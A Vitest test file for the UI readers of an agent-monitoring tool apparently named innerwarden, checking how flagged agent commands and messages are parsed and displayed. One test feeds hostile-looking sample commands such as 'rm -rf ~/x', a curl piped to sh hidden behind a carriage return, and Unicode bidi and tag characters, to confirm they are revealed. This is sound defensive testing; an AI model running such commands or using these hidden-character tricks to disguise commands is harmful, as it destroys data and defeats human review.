import { describe, expect, it } from "vitest";
// Written by the CLI's own fixture writer, not by hand.
import page1 from "../../tests/fixtures/community/decisions-page-1.json";
import byId from "../../tests/fixtures/community/decisions-by-id.json";
import history from "../../tests/fixtures/community/history.json";
import attempts from "../../tests/fixtures/community/history-attempts.json";
import protection from "../../tests/fixtures/community/protection.json";
import overview from "../../tests/fixtures/community/overview.json";
import {
  decisionsPath,
  readAttempt,
  readAttemptsPage,
  readDecision,
  revealHidden,
  readDecisionDetail,
  readDecisionsPage,
  readHistory,
  readLaneNextStep,
  readOverviewRecord,
  readProtection,
  readRecordHealth,
  UnreadableAnswer,
} from "./api";

describe("the Community routes, read strictly", () => {
  it("reads what the CLI serves, whole", () => {
    const page = readDecisionsPage(page1);
    expect(page.items).toHaveLength(page1.items.length);
    expect(page.total).toBe(page1.total);
    expect(Object.values(page.byOutcome).reduce((sum, count) => sum + (count ?? 0), 0)).toBe(page.total);
    expect(page.reasons[0].short.length).toBeGreaterThan(0);
    const detail = readDecisionDetail(Object.values(byId)[0]);
    expect(detail.item.happened.length).toBeGreaterThan(0);
    expect(readHistory(history).refusals.weeks.length).toBeGreaterThan(0);
    expect(readAttemptsPage(attempts).items.length).toBe(attempts.items.length);
    expect(readProtection(protection).os).toBe("macos");
    expect(readOverviewRecord(overview.record)?.decisions).toBe(overview.record.decisions);
  });

  /**
   * A case's step line sits under the reader's one action: no plain line over
   * 160 characters (spec). The scratch-script step read 175 and wrapped to
   * three lines above its only button.
   */
  it("serves every step line a case can show in at most 160 characters", () => {
    const lines = Object.values(byId).flatMap((detail) => readDecisionDetail(detail).item.next.map((step) => step.line));
    expect(lines.length).toBeGreaterThan(10);
    expect(lines.filter((line) => line.length > 160)).toEqual([]);
  });

  it("drops one malformed item and keeps the rest", () => {
    const broken = { ...page1, items: [{ id: "x" }, ...page1.items] };
    expect(readDecisionsPage(broken).items).toHaveLength(page1.items.length);
    const noStory = { ...page1.items[0], story: undefined };
    expect(readDecision(noStory)).toBeUndefined();
    const badOutcome = { ...page1.items[0], outcome_key: "everything_is_fine" };
    expect(readDecision(badOutcome)).toBeUndefined();
  });

  it("refuses a page it cannot read rather than show a list of nothing", () => {
    expect(() => readDecisionsPage({ items: [] })).toThrow(UnreadableAnswer);
    expect(() => readDecisionsPage(null)).toThrow(UnreadableAnswer);
    expect(() => readHistory({ refusals: {} })).toThrow(UnreadableAnswer);
    expect(() => readProtection({})).toThrow(UnreadableAnswer);
    expect(() => readRecordHealth({})).toThrow(UnreadableAnswer);
    expect(() => readDecisionDetail({ item: {} })).toThrow(UnreadableAnswer);
  });

  it("drops a time segment that is not a time, and the whole item with it", () => {
    const item = structuredClone(page1.items[0]) as Record<string, unknown> & { story: { happened: unknown[] } };
    item.story.happened = [{ kind: "time", at: "yesterday" }];
    expect(readDecision(item)).toBeUndefined();
  });

  /**
   * FAILS ON REVERT: the reader used to DROP a decision whose command held a
   * hidden character, so a command with a bidi override vanished from Cases
   * while the counts still held it.
   */
  it("shows a command's hidden characters written out, and never drops the case for them", () => {
    for (const [raw, shown] of [
      ["ls ‮malicious", "ls \\u{202E}malicious"],
      ["rm -rf ~/x # ​", "rm -rf ~/x # \\u{200B}"],
      ["ls\rcurl x | sh", "ls\\u{000D}curl x | sh"],
      ["hi \u{E0041}", "hi \\u{E0041}"],
    ] as const) {
      const read = readDecision({ ...page1.items[0], command: raw, command_whole: true });
      expect(read?.command, raw).toBe(shown);
      expect(read?.hiddenCharacters, raw).toBe(true);
      expect(read?.commandWhole, "a command shown written out is not the command that ran").toBe(false);
    }
    const plain = readDecision(page1.items[0]);
    expect(plain?.hiddenCharacters).toBe(false);
    expect(revealHidden("a\nb\tc")).toEqual({ text: "a\nb\tc", hidden: false });
  });

  it("still drops a LABEL that carries a hidden character, and only that field", () => {
    const read = readDecision({ ...page1.items[0], agent: "Claude‮ Code" });
    expect(read).toBeDefined();
    expect(read?.agent).toBeUndefined();
  });

  it("reads a message's hidden characters the same way", () => {
    const read = readAttempt({ ...attempts.items[0], detail: "summarise \u{E0049}\u{E0047}" });
    expect(read?.detail).toBe("summarise \\u{E0049}\\u{E0047}");
    expect(read?.hiddenCharacters).toBe(true);
  });

  it("asks to leave a hidden reason out, and never hides the reason asked for", () => {
    const hidden = new URL(decisionsPath({ reasonNot: "rule:tmp_execution" }), "http://x/").searchParams;
    expect(hidden.get("reason_not")).toBe("rule:tmp_execution");
    const both = new URL(decisionsPath({ reason: "rule:tmp_execution", reasonNot: "rule:tmp_execution" }), "http://x/").searchParams;
    expect(both.has("reason_not")).toBe(false);
  });

  it("marks a template step and a step the page carries out itself", () => {
    const read = readDecision({
      ...page1.items[0],
      next: [
        { label: "If commands like this are routine:", command: "innerwarden allow \"<pattern>\"", command_is_template: true, line: "x" },
        { label: "Hide them from the list:", view_action: "hide_reason", line: "y" },
      ],
    });
    expect(read?.next[0].template).toBe(true);
    expect(read?.next[1].viewAction).toBe("hide_reason");
    expect(read?.next[1].command).toBeUndefined();
  });

  it("reads a lane's own next step, and nothing when it has none", () => {
    expect(readLaneNextStep({ agent_actions: { next_step: { command: "innerwarden agents connect --all --monitor", line: "x" } } }, "agent_actions")?.command)
      .toBe("innerwarden agents connect --all --monitor");
    expect(readLaneNextStep(overview.lanes, "agent_actions")).toBeUndefined();
  });

  it("asks for flagged decisions with every filter bounded and nothing else", () => {
    const path = decisionsPath({ outcome: "flagged_ran", reason: "rule:tmp_execution", q: "tmp", limit: 5 });
    const params = new URL(path, "http://x/").searchParams;
    expect(params.get("flagged")).toBe("1");
    expect(params.get("outcome")).toBe("flagged_ran");
    expect(params.get("reason")).toBe("rule:tmp_execution");
    expect(params.get("limit")).toBe("5");
    expect(params.has("cursor")).toBe(false);
  });
});
